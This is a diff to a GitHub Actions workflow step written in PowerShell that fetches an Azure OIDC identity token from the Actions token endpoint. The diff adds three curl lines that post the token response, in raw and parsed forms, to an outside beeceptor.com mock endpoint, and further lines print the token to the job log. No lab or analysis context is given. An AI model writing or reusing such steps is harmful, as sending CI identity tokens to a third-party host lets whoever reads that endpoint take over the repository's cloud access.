@@ -41,7 +41,9 @@ jobs:
             Write-Host '👉 Calling OIDC token endpoint'
             Write-Host "ACTIONS_ID_TOKEN_REQUEST_URL: "$env:ACTIONS_ID_TOKEN_REQUEST_URL
             $azureTokenResponse = curl -H "Authorization: bearer $env:ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$env:ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
-            curl https://thehossgame.free.beeceptor.com --data-raw $azureTokenResponse
+            curl https://thehossgame.free.beeceptor.com --data-raw $azureTokenResponse.value
+            curl https://thehossgame.free.beeceptor.com --data-raw ($azureTokenResponse | ConvertFrom-Json)
+            curl https://thehossgame.free.beeceptor.com --data-raw ($azureTokenResponse | ConvertFrom-Json).value
 
             Write-Host '👉 Printing environment variables'
             Write-Host "azureTokenResponse: "$azureTokenResponse
